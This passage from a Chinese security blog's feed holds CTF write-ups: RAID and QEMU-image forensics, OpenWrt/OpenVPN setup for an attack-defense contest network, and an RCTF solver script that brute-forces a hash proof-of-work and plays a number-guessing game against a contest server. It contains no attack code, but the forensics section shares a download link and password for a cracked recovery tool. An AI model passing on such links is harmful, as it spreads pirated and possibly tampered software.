将得到的字符放入下个函数的参数中</span></span><br><span class="line"><span class="hljs-comment"># get_more('aave')</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;先运行<code>get_fore()</code>得到部分flag，然后代入<code>get_more()</code>，在该函数里按照向前、向后的注释运行，最终得到flag：<code>rime_doesnt_have_a_logo</code>。但是提交发现不对，然后队里的pwn大佬提出试一下前面加个<code>c</code>（’crime –&gt; 罪恶’），即<code>crime_doesnt_have_a_logo</code>，bingo！</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="simple-recovery"><a href="#simple-recovery" class="headerlink" title="simple_recovery"></a>simple_recovery</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Simple Recovery Try to recover the data from these RAID 5 images!</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;给了两个镜像文件，file了一下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disk.img0: Hitachi SH big-endian COFF object, not stripped</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;参考链接：<a href="https://forensic.n0fate.com/2010/05/29/raid-system-forensics/" target="_blank" rel="noopener">https://forensic.n0fate.com/2010/05/29/raid-system-forensics/</a></p><p>&emsp;&emsp;发现是要从两个raid5的镜像文件中恢复完整镜像，找到个破解版工具（建议虚拟机下使用）：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1lFsZ27h1rhZ_kEbglO4yBg 密码：o0ps</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;最后可以得到一个完整的镜像文件，找到flag：</p><p><div align="center"><br>    <img src="/images/posts/csaw/7.png"><br></div><br>&emsp;&emsp;flag{dis_week_evry_week_dnt_be_securty_weak}</p><h3 id="🐼-Rewind"><a href="#🐼-Rewind" class="headerlink" title="🐼 Rewind"></a>🐼 Rewind</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sometimes you have to look back and replay what has been done right and wrong</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;压缩包解开后有一个镜像文件和一份日志，file一下发现：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rewind-rr-snp: QEMU suspend to disk image</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;发现是QEMU image，先是用010找了一下。</p><p><div align="center"><br>    <img src="/images/posts/csaw/8.png"><br></div><br>&emsp;&emsp;发现一大堆flag，但是我试到第三的时候flag就对了。。。</p><p><div align="center"><br>    <img src="/images/posts/csaw/9.png"><br></div><br>&emsp;&emsp;flag：flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;很久没活动了，web能力显著下降。。。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>[随手记]记一次线上AWD的网络配置</title>
    <link href="http://yoursite.com/2018/06/awd-network/"/>
    <id>http://yoursite.com/2018/06/awd-network/</id>
    <published>2018-06-02T08:47:56.000Z</published>
    <updated>2018-11-23T12:40:31.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;线下的AWD往往需要线上预选，而且频率也比较少，有空时可以玩玩线上的AWD模式，但涉及的一个问题就是<code>虚拟组网</code>，这篇主要记录下faustctf的线上AWD网络设置。<br><a id="more"></a></p><h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><div align="center"><br>    <img src="/images/posts/other/28.png" height="500px" width="700px"><br></div><br>&emsp;&emsp;首先这是官方的网络拓扑图，其相关说明如下：<br><br><strong>VPN routing networks:</strong><br><em> 10.65.&lt;team_ID&gt;.1: Competiton gateway</em> 10.65.&lt;team_ID&gt;.2: Team router<br><br><br><strong>Team networks: 10.66.&lt;team_ID&gt;.0/24</strong><br><em> Vulnbox: 10.66.&lt;team_ID&gt;.2</em> Competition infrastructure (flag submission etc.): 10.67.0.0/16<br><br>&emsp;&emsp;<code>team_ID</code>是主办方发配给你的队伍id，同时主办方也会发放<code>VPN</code>供你连接比赛网络。其中一部分配置如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig 10.65.68.2 10.65.68.1</span><br><span class="line">route 10.66.0.0 255.255.0.0</span><br><span class="line">route 10.67.0.0 255.255.0.0</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;可以看到10.66/67网段的已经添加进路由了。<br><br>&emsp;&emsp;主办方的设置是：<br>&gt;在我们的设置中，一台物理机将托管Vulnbox并充当您的个人VPN网关。所有的团队成员都将他们的个人电脑连接到团队网络，机器也作为网关。因此，团队成员可以联系您的Vulnbox，其他团队和互联网。<br><br>&emsp;&emsp;要求是要拥有<code>两块网口的PC</code>，而我这里并没有两个网口，但我有一个<code>openwrt</code>的路由器，它提供了丰富的应用，其中就包含VPN。如果你已经有openwrt了，可以使用如下安装VPN：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opkg update</span><br><span class="line">opkg install openvpn-openssl openvpn-easy-rsa</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;在具体的操作可以参考：<a href="https://www.ifshow.com/openwrt-install-openvpn-client/" target="_blank">这个文章</a>。开启可以用：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --config /etc/openvpn/yourconf.conf</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;如果成功你可以看到新增了一个网卡：<br><div align="center"><br>    <img src="/images/posts/other/29.png" height="60%"><br></div><br>&emsp;&emsp;然后在路由器里已经可以ping通主办方的<code>网关</code>。<br><div align="center"><br>    <img src="/images/posts/other/30.png" height="60%"><br></div><br>&emsp;&emsp;但我们使用的主机和vulnbox还不能接入网络，我们需要配置<code>10.66.&lt;team_ID&gt;.0/24</code>的网络，这个就简单了，在路由器的接口网络中选择10.66.68.1即可，如：<br><div align="center"><br>    <img src="/images/posts/other/31.png" height="60%"><br></div><br>&emsp;&emsp;配好以后我们就正式接入AWD的游戏网络了，我们可以ping主办方的<code>NPC</code>检查：<br><div align="center"><br>    <img src="/images/posts/other/32.png" height="60%"><br></div><br><div align="center"><br>    <img src="/images/posts/other/33.png" height="60%"><br></div><p>&emsp;&emsp;此时，我们只要将vulnbox在虚拟机中起起来就行了，但由于虚拟机采用公私钥验证，启动虚拟机时需要我们输入主办方的私钥文件，但因为我们无法通过ssh上去，所以我们无法进行复制粘贴，这个问题我们可以通过<code>串口通信</code>来解决。</p><p>&emsp;&emsp;解决方法如下：</p><p>&emsp;&emsp;1、在虚拟机中设置串口通信，选择命名管道，名字为：<code>//./pipe/com_1</code>：</p><p><div align="center"><br>    <img src="/images/posts/other/34.png" height="60%"><br></div><br>&emsp;&emsp;2、接着使用putty连接：</p><p><div align="center"><br>    <img src="/images/posts/other/35.png" height="50%"><br></div><br>&emsp;&emsp;这时我们就能实现ssh的功能了，可以进行复制粘贴了。</p><p>&emsp;&emsp;但遗憾的是接入没几分钟虚拟机就被打爆了，按照主办方的配置应该是：</p><blockquote><p>We suggest giving your VM at least 3 CPU cores and 6 GB of RAM.</p></blockquote><p><div align="center"><br>    <img src="/images/posts/other/36.png" height="50%"><br></div><br>&emsp;&emsp;但我只能配2<em>cpu + 2g</em>RAM，远达不到要求，只能匆匆下线。不过题目初步看了一下是<code>区块链</code>相关的，很有意思，有兴趣可以跟一下wp。<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;线下的AWD往往需要线上预选，而且频率也比较少，有空时可以玩玩线上的AWD模式，但涉及的一个问题就是&lt;code&gt;虚拟组网&lt;/code&gt;，这篇主要记录下faustctf的线上AWD网络设置。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2018 writeup1</title>
    <link href="http://yoursite.com/2018/05/rctf-writeup1/"/>
    <id>http://yoursite.com/2018/05/rctf-writeup1/</id>
    <published>2018-05-21T08:47:56.000Z</published>
    <updated>2018-11-23T12:48:18.637Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;<del>CTFer是不存在周末的，更不存在520….</del><br><a id="more"></a></p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>&emsp;&emsp;首先查看了<code>git log</code>但没有线索，思索了一下就直接去查看git文件，最终找到flag.txt。</p><p><div align="center"><br>    <img src="/images/posts/rctf/1.png" height="60%"><br></div><br>&emsp;&emsp;接着在<code>logs/HEAD</code>里找到存在flag.txt的编码，再<code>穿越</code>回去即可恢复flag文件。</p><p><div align="center"><br>    <img src="/images/posts/rctf/2.png" height="60%"><br></div><br>&emsp;&emsp;flag为：<code>RCTF{gIt_BranCh_aNd_l0g}</code>。</p><h3 id="sign"><a href="#sign" class="headerlink" title="sign"></a>sign</h3><p>&emsp;&emsp;下载后是个<code>exe</code>，但不能运行，用<code>IDA</code>打开后在<code>WinMain</code>函数里可以找到<code>明文</code>的flag，但这个跟<code>IDA</code>的版本有关系，作者的<code>IDA7.0</code>就不行，但队友的OK。</p><h3 id="Number-Game"><a href="#Number-Game" class="headerlink" title="Number Game"></a>Number Game</h3><p>&emsp;&emsp;比较有意思的一道题，一开始手工各种玩，但根据以往出题人的尿性，越往后时间肯定越短，所以只能考虑自动化脚本提交，然后就去Google了一下<code>猜数字游戏</code>，得到有价值的线索。</p><p><div align="center"><br>    <img src="/images/posts/rctf/3.png" height="50%"><br></div><br>&emsp;&emsp;点开看了一下，很真的是一样的玩法，而且下面还有个解题脚本，但由于那个脚本太过复杂，不利于快速修改，只好去<code>gayhub(github)</code>搜索，最终找到一个匹配度极高的<code>solve.py</code>，<a href="https://github.com/hashmymind/1a2b/blob/master/1a2b.py" target="_blank">传送门</a>。</p><blockquote><p>PS: gayhub真是个好东西</p></blockquote><p>&emsp;&emsp;拿到脚本后进行改造，最终的脚本如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> string</span><br><span class="line"><span class="hljs-keyword">import</span> hashlib</span><br><span class="line"><span class="hljs-keyword">import</span> socket</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sha256</span><span class="hljs-params">(s)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> hashlib.sha256(s).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">(a, goal)</span>:</span></span><br><span class="line">    strs = string.letters + string.digits</span><br><span class="line">    print(<span class="hljs-string">'[+]爆破中...'</span>)</span><br><span class="line">    rnds = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> strs:</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:</span><br><span class="line">            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> strs:</span><br><span class="line">                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> strs:</span><br><span class="line">                    rnds = i + j + k + l</span><br><span class="line">                    result = sha256(rnds + a)</span><br><span class="line">                    <span class="hljs-keyword">if</span> result == goal:</span><br><span class="line">                        <span class="hljs-keyword">return</span> rnds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">all_char=[<span class="hljs-string">'0'</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>,<span class="hljs-string">'3'</span>,<span class="hljs-string">'4'</span>,<span class="hljs-string">'5'</span>,<span class="hljs-string">'6'</span>,<span class="hljs-string">'7'</span>,<span class="hljs-string">'8'</span>,<span class="hljs-string">'9'</span>]</span><br><span class="line">is_visited=[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]</span><br><span class="line">all_combine=[]</span><br><span class="line">temp=[<span class="hljs-string">''</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>]</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate</span><span class="hljs-params">(step)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">if</span> step==<span class="hljs-number">4</span>:</span><br><span class="line">        all_combine.append(<span class="hljs-string">''</span>.join(temp))</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> is_visited[i]:<span class="hljs-keyword">continue</span></span><br><span class="line">            temp[step]=all_char[i]</span><br><span class="line">            is_visited[i]=<span class="hljs-number">1</span></span><br><span class="line">            generate(step+<span class="hljs-number">1</span>)</span><br><span class="line">            is_visited[i]=<span class="hljs-number">0</span></span><br><span class="line">generate(<span class="hljs-number">0</span>)</span><br><span class="line">now=all_combine[random.randint(<span class="hljs-number">0</span>,len(all_combine)<span class="hljs-number">-1</span>)]</span><br><span class="line">the_leaf=all_combine[:]</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_type_t</span><span class="hljs-params">(ra,rb)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>*(ra+<span class="hljs-number">1</span>)+rb</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_type_s</span><span class="hljs-params">(a,b)</span>:</span></span><br><span class="line">    aa=[a[<span class="hljs-number">0</span>],a[<span class="hljs-number">1</span>],a[<span class="hljs-number">2</span>],a[<span class="hljs-number">3</span>]]</span><br><span class="line">    bb=[b[<span class="hljs-number">0</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">2</span>],b[<span class="hljs-number">3</span>]]</span><br><span class="line">    cc=[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]</span><br><span class="line">    ra=<span class="hljs-number">0</span></span><br><span class="line">    rb=<span class="hljs-number">0</span></span><br><span class="line">    s=<span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>):</span><br><span class="line">        <span class="hljs-keyword">if</span> aa[i]==bb[i]:</span><br><span class="line">            ra+=<span class="hljs-number">1</span></span><br><span class="line">            cc[i]=<span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>):</span><br><span class="line">        <span class="hljs-keyword">if</span> cc[i]:<span class="hljs-keyword">continue</span></span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>):</span><br><span class="line">            <span class="hljs-keyword">if</span> aa[i]==bb[j]:</span><br><span class="line">                rb+=<span class="hljs-number">1</span></span><br><span class="line">    s=get_type_t(ra,rb)</span><br><span class="line">    <span class="hljs-keyword">return</span> s</span><br><span class="line"></span><br><span class="line">n = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-comment"># 传入a,b</span></span><br><span class="line"><span class="hljs-comment"># 返回now</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess_num</span><span class="hljs-params">(a, b)</span>:</span></span><br><span class="line">    a = int(a)</span><br><span class="line">    b = int(b)</span><br><span class="line">    <span class="hljs-keyword">global</span> n, now, the_leaf</span><br><span class="line">    print(<span class="hljs-string">"第"</span>+str(n)+<span class="hljs-string">"猜"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> a+b &gt;<span class="hljs-number">4</span>:</span><br><span class="line">        print(<span class="hljs-string">"輸入有錯"</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span></span><br><span class="line">    <span class="hljs-keyword">elif</span> a==<span class="hljs-number">4</span>:</span><br><span class="line">        print(<span class="hljs-string">"贏惹啦"</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        s=get_type_t(a,b)</span><br><span class="line">    temp=[]</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(the_leaf)):</span><br><span class="line">        <span class="hljs-keyword">if</span> get_type_s(now,the_leaf[i])==s:</span><br><span class="line">            temp.append(the_leaf[i])</span><br><span class="line">    the_leaf=temp[:]</span><br><span class="line">    <span class="hljs-keyword">if</span> len(the_leaf)==<span class="hljs-number">0</span>:</span><br><span class="line">        print(<span class="hljs-string">"你一定有輸入錯"</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span></span><br><span class="line">    <span class="hljs-keyword">elif</span> len(the_leaf)==<span class="hljs-number">1</span>:</span><br><span class="line">        print(<span class="hljs-string">"答案是 "</span>+the_leaf[<span class="hljs-number">0</span>]+<span class="hljs-string">" 不然就是你輸入有錯"</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> the_leaf[<span class="hljs-number">0</span>]</span><br><span class="line">    now=the_leaf[random.randint(<span class="hljs-number">0</span>,len(the_leaf)<span class="hljs-number">-1</span>)]</span><br><span class="line">    n+=<span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">return</span> now</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = socket.socket()  <span class="hljs-comment"># 创建 socket 对象</span></span><br><span class="line">host = <span class="hljs-string">"149.28.139.172"</span>  <span class="hljs-comment"># 获取本地主机名</span></span><br><span class="line">port = <span class="hljs-number">10002</span>  <span class="hljs-comment"># 设置端口</span></span><br><span class="line">addr = (host, port)</span><br><span class="line">sc.connect(addr)  <span class="hljs-comment"># 绑定端口号</span></span><br><span class="line">tmp = sc.recv(<span class="hljs-number">1024</span>)</span><br><span class="line">print(tmp + sc.recv(<span class="hljs-number">1024</span>))</span><br><span class="line">gg = re.findall(<span class="hljs-string">'\+(.*)\)'</span>, tmp)[<span class="hljs-number">0</span>]</span><br><span class="line">sha = re.findall(<span class="hljs-string">'== (.*)'</span>, tmp)[<span class="hljs-number">0</span>]</span><br><span class="line">go = fuzz(gg, sha)</span><br><span class="line">print(<span class="hljs-string">'[*]爆破完成：'</span>+go)</span><br><span class="line">sc.send(go+<span class="hljs-string">'\n'</span>)</span><br><span class="line">print(sc.recv(<span class="hljs-number">2048</span>))</span><br><span class="line">print(sc.recv(<span class="hljs-number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">one_round</span><span class="hljs-params">(rd)</span>:</span></span><br><span class="line">    nums = <span class="hljs-string">' '</span>.join(now)</span><br><span class="line">    print(<span class="hljs-string">'[+]guess: '</span> + nums)</span><br><span class="line">    sc.send(nums + <span class="hljs-string">'\n'</span>)</span><br><span class="line">    rev = sc.recv(<span class="hljs-number">1024</span>)</span><br><span class="line">    print(<span class="hljs-string">'[+]raw: '</span> + rev)</span><br><span class="line">    a = re.findall(<span class="hljs-string">'\d'</span>, rev)[<span class="hljs-number">0</span>]</span><br><span class="line">    b = re.findall(<span class="hljs-string">'\d'</span>, rev)[<span class="hljs-number">1</span>]</span><br><span class="line">    print(<span class="hljs-string">'[+]result: '</span> + a + <span class="hljs-string">' '</span> + b)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):</span><br><span class="line">        hh = guess_num(a,b)</span><br><span class="line">        <span class="hljs-keyword">if</span> hh == <span class="hljs-keyword">None</span>:</span><br><span class="line">            print(<span class="hljs-string">'[*]程序出错！'</span>)</span><br><span class="line">            exit(<span class="hljs-number">1</span>)</span><br><span class="line">        nums = <span class="hljs-string">' '</span>.join(hh)</span><br><span class="line">        print(<span class="hljs-string">'[+]guess: '</span> + nums)</span><br><span class="line">        sc.send(nums + <span class="hljs-string">'\n'</span>)</span><br><span class="line">        rev = sc.recv(<span class="hljs-number">1024</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">'You lose'</span>, rev):</span><br><span class="line">            print(<span class="hljs-string">'[!]预测出错，请重新启动！'</span>)</span><br><span class="line">            exit(<span class="hljs-number">1</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">'You got it'</span>, rev):</span><br><span class="line">            print(<span class="hljs-string">'[*]第&#123;&#125;关完成！'</span>.format(rd))</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line">        a = re.findall(<span class="hljs-string">'\d'</span>, rev)[<span class="hljs-number">0</span>]</span><br><span class="line">        b = re.findall(<span class="hljs-string">'\d'</span>, rev)[<span class="hljs-number">1</span>]</span><br><span class="line">        print(<span class="hljs-string">'[+]result: '</span> + a + <span class="hljs-string">' '</span> + b)</span><br><span class="line"></span><br><span class="line">    flag = sc.recv(<span class="hljs-number">1024</span>)</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">'flag'</span>, flag, re.IGNORECASE):</span><br><span class="line">        print(<span class="hljs-string">'[*]已找到flag！'</span>)</span><br><span class="line">        exit(<span class="hljs-number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> rd <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):</span><br><span class="line">    generate(<span class="hljs-number">0</span>)</span><br><span class="line">    now=all_combine[random.randint(<span class="hljs-number">0</span>,len(all_combine)<span class="hljs-number">-1</span>)]</span><br><span class="line">    the_leaf=all_combine[:]</span><br><span class="line">    one_round(rd + <span class="hljs-number">1</span>)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;脚本存在一定误差率，如果提示失败，请多试几次。</p><p>&emsp;&emsp;flag：<code>RCTF{0lD_GaM3_nAmed_Bu11s_4nd_C0ws}</code>。</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>&emsp;&emsp;这道题是跟队友一起做的，我负责打酱油。。。</p><p>&emsp;&emsp;首先题目给出了两个文件，一个可执行文件（<code>babyre</code>），一个输出文件（<code>out</code>）。out文件内容如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">B80C91FE70573EFE</span><br><span class="line">BEED92AE7F7A8193</span><br><span class="line">7390C17B90347C6C</span><br><span class="line">AA7A15DFAA7A15DF</span><br><span class="line">526BA076153F1A32</span><br><span class="line">545C15AD7D8AA463</span><br><span class="line">526BA076FBCB7AA0</span><br><span class="line">7D8AA4639C513266</span><br><span class="line">526BA0766D7DF3E1</span><br><span class="line">AA7A15DF9C513266</span><br><span class="line">1EDC38649323BC07</span><br><span class="line">7D8AA463FBCB7AA0</span><br><span class="line">153F1A32526BA076</span><br><span class="line">F5650025AA7A15DF</span><br><span class="line">1EDC3864B13AD888</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;一开始没看出这是程序运行过程产生的输出结果，是队友提供的思路。</p><p>&emsp;&emsp;用<code>IDA</code>查看了一下，只有一个地方有<code>printf</code>输出。</p><p><div align="center"><br>    <img src="/images/posts/rctf/4.png" height="50%"><br></div><br>&emsp;&emsp;认真观察输出结果跟代码后可以发现，程序循环30次，每次输出8位字符，而这个跟题目给出的文件（15行，每行16位）高度吻合，所以猜测这些就是我们要找的flag。</p><p>&emsp;&emsp;然后运行一下程序，发现特定的字符不管运行几次结果都一样，所以解题思路就是爆破<code>ASCII码表</code>。我们可以<code>先</code>将可见字符的8位输出结果保存起来，然后进行比对。最后写了个半自动脚本：<br><figure class="highlight python 